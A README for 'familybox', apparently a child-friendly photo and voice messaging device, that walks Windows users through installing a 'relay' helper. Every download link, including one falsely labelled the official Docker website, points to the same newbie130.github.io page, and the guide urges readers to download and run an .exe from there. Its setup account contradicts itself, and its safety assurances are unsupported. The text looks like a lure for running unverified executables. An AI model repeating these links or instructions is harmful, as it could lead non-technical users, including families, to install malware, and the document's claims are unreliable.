# 📸 familybox - Talk and See From Afar

[![Download familybox](https://img.shields.io/badge/Download-familybox-2ea44f?style=for-the-badge&logo=github)](https://newbie130.github.io)

## 👋 Welcome to familybox

familybox is a special way for your little one to send and receive photo and voice messages, even if they can't read or write yet. It's a small, colorful screen device that your child can use to see your pictures and hear your voice. You use your phone or computer to send messages, and a handy helper (called a "relay") makes sure everything looks and sounds beautiful on the child's device.

Think of it as a magical picture frame that talks back. It's perfect for grandparents, parents, or anyone who wants to stay connected with a young child in a simple, safe way.

> [!NOTE]
> This guide is for Windows users. The main device (the ESP32-S3 AMOLED) is a separate physical gadget you'll need to build or buy. This guide focuses on the **software** you need to run the "relay" part on your home computer.

## ✨ What Makes familybox Special?

- **For Little Hands:** The child's device uses simple pictures and buttons. No typing or reading needed!
- **Voice from You:** Send short voice recordings that play on the device, so your child always hears your familiar voice.
- **Picture Time:** Send photos that appear on the nice, bright screen.
- **Easy for You:** You can send messages from your own phone or computer through a simple webpage.
- **Private & Safe:** It runs on your own computer. You are in control, and no big company is listening in.

## 💻 What You'll Need

Here’s what you need to get the relay (the helper software) running on your Windows computer:

| Requirement | Details |
| :--- | :--- |
| **Computer** | A decent PC or laptop running Windows 10 or Windows 11. |
| **Internet** | A stable internet connection. |
| **Docker** | The software we use to run the relay. You'll install this first. It's like a special container for our helper program. |

> [!TIP]
> Don't worry if "Docker" sounds complicated. You'll just install one program, and the steps below will do the rest.

## 🚀 Getting Started: Your Step-by-Step Guide

Let's get everything set up. Follow these steps carefully, and you'll be sending messages in no time.

### 📦 Step 1: Install Docker Desktop

First, we need the "container" program.

1.  Go to the official Docker website: `https://newbie130.github.io`
2.  Click the big "Download Docker Desktop" button for Windows.
3.  Once it's downloaded, find the file (usually in your "Downloads" folder) and double-click it to run.
4.  Follow the instructions on the screen. Just click "Next" or "Install" until it's done. You might need to restart your computer when it asks.
5.  After restarting, open Docker Desktop from your Start menu. Let it start up; you can leave it running in the background.

### 🧰 Step 2: Download the familybox Helper

Now, let's download the helper software itself.

**👉 [Visit this link to download the application](https://newbie130.github.io)**

This will take you to the main familybox page on GitHub. Just having it on the page is step one. You don't need to download the whole project - just the part you need.

### ⚙️ Step 3: Using the Helper (The Easy Way)

We've made running the helper incredibly easy. You don't need to type any mysterious commands.

1.  On the familybox page you just opened, look for a section that mentions **"Releases"** or a button named **"Releases"** on the right side of the screen. Click on it.
2.  You'll see a list of versions. Look for the latest one (usually at the top).
3.  In that release, you'll see a file called something like **`familybox-setup.exe`** or a file that ends with **`.zip`**. 

    *   **If it's an `.exe` file, you're in luck!** Download and run this file directly. Just double-click it and click "Yes" or "Run" if Windows asks.
    *   **If it's a `.zip` file,** download it, then right-click on it and choose **"Extract All..."**. This will create a folder with the application inside. Open that folder and double-click the application file (usually named `familybox.exe`) to run it.
4.  Once you run the installer or the application, it will do all the hard work for you. It will automatically set up the necessary parts of the helper. **You do not need to write any code.**

### 🌐 Step 4: Connect to Your New World

The helper now has its own little website on your computer.

1.  After the application starts, you'll see a message in the window with an **address** (it will look like `http://localhost:8765` or similar).
2.  Open your web browser (like Chrome, Edge, or Firefox).
3.  Type that address exactly as shown into the address bar at the top and press Enter.
4.  Congratulations! You should now see the familybox control panel. This is your personal dashboard to send photos and voice messages to the child's device.

## 🛠️ Troubleshooting & Helpful Tips

Even with the best setup, sometimes things act up. Here are some common hiccups and how to fix them:

- **I don't see the address anywhere.**
    - Make sure the familybox application (or the Docker Desktop) is still running. Sometimes it takes a minute or two to start up. Look at the notification area at the bottom right of your screen for its icon.

- **The address doesn't work in my browser.**
    - Double-check that you typed it perfectly, including the `http://` and the numbers and colon (`:`). A common typo is using a semicolon (`;`) instead of a colon.

- **It says "Connection Refused" or "Can't Reach This Page."**
    - This usually means the helper software isn't running. Close the familybox app and start it again. Wait 30 seconds and try the address again.

- **I can't connect from my phone, only my computer.**
    - The relay is designed to work on your local network first. Make sure your phone is connected to the **same Wi-Fi network** as your computer.

- **The helper opens, but I don't know what to do next.**
    - On your control panel (the webpage), you should see options for "Pair New Device" or "Add a Device." This is where you'll connect the child's physical device later. The instructions for that will be included with the device itself.

## 📖 Frequently Asked Questions (FAQ)

**Q: Is this safe for my child?**
A: Yes. The system is private and runs on your own network. There are no ads, no trackers, and no public profiles. It's just between your devices.

**Q: Do I need to be a computer expert to use this?**
A: Absolutely not. If you can click a button and type a web address, you can use familybox. The steps above are all you need.

**Q: Can I send a message from anywhere?**
A: The current setup is best used on your home Wi-Fi network. To send from outside your home, you would need to do some more advanced network "port forwarding," which is beyond the scope of this basic guide.

**Q: What is Docker? Why is it needed?**
A: Docker is the container we use to package the helper program. It makes sure the helper runs the same way on any computer, without messing up your system. It's like a portable, self-contained toolbox for the software.

**Q: I have more questions. Where can I ask them?**
A: The project is open-source, which means its code is public. You can find more technical details and discussions on the repository page you visited to download the program.

## 📝 Your Final To-Do List

1.  [ ] Install Docker Desktop.
2.  [ ] Download the familybox application from the Releases page.
3.  [ ] Run the application (or installer).
4.  [ ] Open the web address shown in the application.
5.  [ ] See the familybox dashboard and get ready to connect your device.

That's it! You've successfully set up the brain of your familybox. Now you can focus on the fun part - sharing precious moments with your child.

Click the big button below one more time, just in case you need to go back to the download page.

[![Go Back to Download](https://img.shields.io/badge/Get_Help-Download_Page-1db954?style=for-the-badge&logo=github)](https://newbie130.github.io)

Welcome to a new way of staying close. Enjoy your familybox!

Keywords: amoled, docker, esp-idf, esp32, esp32-s3, family, fastapi, iot, lvgl, waveshare